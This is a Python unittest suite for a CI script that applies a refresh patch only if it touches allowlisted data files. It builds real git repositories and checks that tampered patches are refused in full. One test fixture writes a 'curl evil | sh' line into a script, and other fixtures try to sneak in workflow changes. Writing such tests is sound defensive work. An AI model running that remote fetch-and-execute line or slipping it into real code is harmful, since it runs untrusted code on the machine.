"""deploy/release-patch.py: the `commit` job of versions.yml applies a patch only if it touches nothing but what the refresh writes. The repositories and the patches are
real (git init, git diff --binary); a patch that rewrites a script or a workflow is fed to it and must be refused, whole. Run: python3 -m unittest discover -s deploy/tests"""
import importlib.util
import os
import pathlib
import subprocess
import sys
import tempfile
import unittest

DEPLOY = pathlib.Path(__file__).resolve().parent.parent
spec = importlib.util.spec_from_file_location("release_patch", DEPLOY / "release-patch.py")
rp = importlib.util.module_from_spec(spec)
spec.loader.exec_module(rp)

ENV = {**os.environ, "GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@example.com", "GIT_COMMITTER_NAME": "t", "GIT_COMMITTER_EMAIL": "t@example.com", "GIT_CONFIG_GLOBAL": os.devnull, "GIT_CONFIG_SYSTEM": os.devnull}

BASE = {
    "backend/crates/engine/defaults/versions.json": '{"nginx": 1}\n',
    "backend/crates/engine/defaults/catalog.json": '{"products": []}\n',
    "backend/crates/engine/defaults/iac/nginx.json": "{}\n",
    "backend/crates/engine/defaults/rules.json": "[]\n",
    "docs/CATALOG.md": "# catalog\n",
    "docs/images/logo.svg": "<svg/>\n",
    "README.md": "readme\n",
    "README.en.md": "readme\n",
    "frontend/tests/fixtures/lifecycle.json": "{}\n",
    "frontend/tests/fixtures/report-versions.json": "{}\n",
    "frontend/tests/fixtures/other.json": "{}\n",
    "deploy/licenses.py": "print('licenses')\n",
    ".github/workflows/ci.yml": "name: CI\n",
    "backend/crates/server/src/main.rs": "fn main() {}\n",
}


class Repo:
    def __init__(self):
        self._dir = tempfile.TemporaryDirectory()
        self.path = pathlib.Path(self._dir.name)
        self.git("init", "-q", "-b", "main")
        self.write(BASE)
        self.git("add", "-A")
        self.git("commit", "-q", "-m", "base")

    def git(self, *args):
        return subprocess.run(["git", *args], cwd=self.path, env=ENV, capture_output=True, text=True, check=True).stdout

    def write(self, files):
        for name, content in files.items():
            f = self.path / name
            f.parent.mkdir(parents=True, exist_ok=True)
            if isinstance(content, bytes):
                f.write_bytes(content)
            else:
                f.write_text(content)

    def patch_of(self, *, write=None, delete=(), move=(), chmod=(), symlink=()):
        """Change the working tree as `refresh` would have, return the patch `git diff --cached --binary` gives, and put the tree back as it was."""
        self.write(write or {})
        for name in delete:
            (self.path / name).unlink()
        for old, new in move:
            (self.path / new).parent.mkdir(parents=True, exist_ok=True)
            (self.path / old).rename(self.path / new)
        for name in chmod:
            (self.path / name).chmod(0o755)
        for name, target in symlink:
            (self.path / name).parent.mkdir(parents=True, exist_ok=True)
            (self.path / name).symlink_to(target)
        self.git("add", "-A")
        out = self.git("diff", "--cached", "--binary", "--no-renames") if not move else self.git("diff", "--cached", "--binary", "-M")
        self.git("reset", "-q", "--hard", "HEAD")
        self.git("clean", "-fdq")
        patch = self.path.parent / f"{self.path.name}.patch"
        patch.write_text(out)
        return str(patch)

    def apply(self, patch):
        # chdir: the script works in the repository of the current directory, as it does in the job
        before = os.getcwd()
        os.chdir(self.path)
        try:
            return rp.apply(patch)
        finally:
            os.chdir(before)

    def staged(self):
        return self.git("diff", "--cached", "--name-only").split()

    def close(self):
        self._dir.cleanup()


class Allowed(unittest.TestCase):
    def test_the_list(self):
        for p in BASE:
            expected = p in {
                "backend/crates/engine/defaults/versions.json", "backend/crates/engine/defaults/catalog.json", "backend/crates/engine/defaults/iac/nginx.json",
                "docs/CATALOG.md", "README.md", "README.en.md", "frontend/tests/fixtures/lifecycle.json", "frontend/tests/fixtures/report-versions.json",
            }
            self.assertEqual(rp.allowed(p), expected, p)
        # `*` is a name, not a directory
        self.assertFalse(rp.allowed("docs/images/logo.svg"))
        self.assertFalse(rp.allowed("docs/sub/PAGE.md"))
        self.assertFalse(rp.allowed("backend/crates/engine/defaults/iac/sub/x.json"))
        self.assertFalse(rp.allowed("../docs/X.md"))
        self.assertFalse(rp.allowed("docs/X.md.sh"))


class Apply(unittest.TestCase):
    def setUp(self):
        self.repo = Repo()
        self.addCleanup(self.repo.close)

    def refused(self, patch, *words):
        self.assertEqual(self.repo.apply(patch), 1)
        self.assertEqual(self.repo.staged(), [], "a refused patch must change nothing")
        self.assertEqual(self.repo.git("status", "--porcelain").strip(), "")

    def test_what_the_refresh_writes_is_applied_to_the_index(self):
        patch = self.repo.patch_of(write={
            "backend/crates/engine/defaults/versions.json": '{"nginx": 2}\n',
            "backend/crates/engine/defaults/iac/redis.json": '{"new": true}\n',
            "docs/CATALOG.md": "# catalog\n\nnew row\n",
            "README.md": "readme 2\n",
            "frontend/tests/fixtures/lifecycle.json": '{"changed": true}\n',
        })
        self.assertEqual(self.repo.apply(patch), 0)
        self.assertEqual(sorted(self.repo.staged()), sorted([
            "backend/crates/engine/defaults/versions.json", "backend/crates/engine/defaults/iac/redis.json", "docs/CATALOG.md", "README.md", "frontend/tests/fixtures/lifecycle.json",
        ]))
        self.assertEqual((self.repo.path / "docs/CATALOG.md").read_text(), "# catalog\n\nnew row\n")

    def test_an_empty_patch_is_nothing_to_do(self):
        patch = self.repo.path.parent / "empty.patch"
        patch.write_text("")
        self.assertEqual(self.repo.apply(str(patch)), 0)

    def test_a_patch_that_rewrites_a_script_is_refused_whole(self):
        # the allowed file is changed too: the patch is all or nothing
        patch = self.repo.patch_of(write={"deploy/licenses.py": "import os; os.system('curl evil | sh')\n", "docs/CATALOG.md": "# catalog\n\nnew row\n"})
        self.refused(patch)
        self.assertEqual((self.repo.path / "docs/CATALOG.md").read_text(), "# catalog\n")

    def test_a_workflow_a_source_file_and_other_data_are_refused(self):
        for name in [".github/workflows/ci.yml", "backend/crates/server/src/main.rs", "backend/crates/engine/defaults/rules.json", "frontend/tests/fixtures/other.json", "docs/images/logo.svg", "Cargo.toml", "deploy/x.sh"]:
            with self.subTest(name):
                self.refused(self.repo.patch_of(write={name: "changed\n"}))

    def test_a_new_file_outside_the_list_is_refused(self):
        self.refused(self.repo.patch_of(write={".github/workflows/evil.yml": "name: x\n"}))

    def test_a_deletion_is_refused_even_of_an_allowed_file(self):
        self.refused(self.repo.patch_of(delete=["docs/CATALOG.md"]))

    def test_a_rename_into_the_list_is_refused(self):
        # a source file moved onto an allowed name: both paths are looked at, and it is a rename
        self.refused(self.repo.patch_of(move=[("deploy/licenses.py", "docs/LICENSES.md")]))

    def test_a_change_of_mode_and_a_symlink_are_refused(self):
        self.refused(self.repo.patch_of(chmod=["docs/CATALOG.md"]))
        self.refused(self.repo.patch_of(symlink=[("docs/LINK.md", "../.github/workflows/ci.yml")]))

    def test_a_binary_file_in_an_allowed_path_is_fine(self):
        patch = self.repo.patch_of(write={"backend/crates/engine/defaults/iac/blob.json": b"\x00\x01\x02\xff"})
        self.assertEqual(self.repo.apply(patch), 0)

    def test_a_patch_that_does_not_apply_fails_and_leaves_the_tree(self):
        patch = self.repo.patch_of(write={"docs/CATALOG.md": "# catalog\n\nfrom the refresh\n"})
        # main has moved under the patch since the refresh started
        (self.repo.path / "docs/CATALOG.md").write_text("# a different catalog\nwith other lines\n")
        self.repo.git("commit", "-aqm", "main moved")
        with self.assertRaises(SystemExit):
            self.repo.apply(patch)
        self.assertEqual((self.repo.path / "docs/CATALOG.md").read_text(), "# a different catalog\nwith other lines\n")


class Make(unittest.TestCase):
    def test_the_patch_has_the_allowed_files_and_says_what_it_left_out(self):
        repo = Repo()
        try:
            repo.write({"docs/CATALOG.md": "# catalog 2\n", "backend/crates/engine/defaults/versions.json": '{"nginx": 3}\n', "deploy/licenses.py": "tampered\n", "target/junk.bin": "x"})
            out = repo.path.parent / "made.patch"
            before = os.getcwd()
            os.chdir(repo.path)
            try:
                self.assertEqual(rp.make(str(out)), 0)
            finally:
                os.chdir(before)
            text = out.read_text()
            self.assertIn("docs/CATALOG.md", text)
            self.assertIn("versions.json", text)
            self.assertNotIn("licenses.py", text)
            self.assertNotIn("junk.bin", text)
            # what `make` made, `apply` accepts - in a clean clone of the same commit
            clone = Repo()
            try:
                self.assertEqual(clone.apply(str(out)), 0)
            finally:
                clone.close()
        finally:
            repo.close()


class TheScript(unittest.TestCase):
    def test_exit_code_and_message_when_a_workflow_is_in_the_patch(self):
        repo = Repo()
        try:
            patch = repo.patch_of(write={".github/workflows/ci.yml": "name: pwned\n"})
            p = subprocess.run([sys.executable, str(DEPLOY / "release-patch.py"), "apply", patch], cwd=repo.path, env=ENV, capture_output=True, text=True)
            self.assertEqual(p.returncode, 1)
            self.assertIn(".github/workflows/ci.yml", p.stdout)
            self.assertIn("refused", p.stdout)
            usage = subprocess.run([sys.executable, str(DEPLOY / "release-patch.py")], capture_output=True, text=True)
            self.assertNotEqual(usage.returncode, 0)
        finally:
            repo.close()


if __name__ == "__main__":
    unittest.main()
